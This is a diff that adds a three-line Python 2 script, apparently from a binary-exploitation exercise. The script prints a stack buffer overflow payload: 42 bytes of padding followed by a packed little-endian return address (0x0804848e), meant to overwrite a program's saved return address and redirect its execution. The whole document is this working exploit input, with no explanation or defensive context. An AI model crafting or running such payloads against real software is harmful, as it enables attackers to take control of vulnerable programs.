@@ -1,0 +1,3 @@
+#!/usr/bin/env python
+print "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDEE"+"\x8e\x84\x04\x08"
+
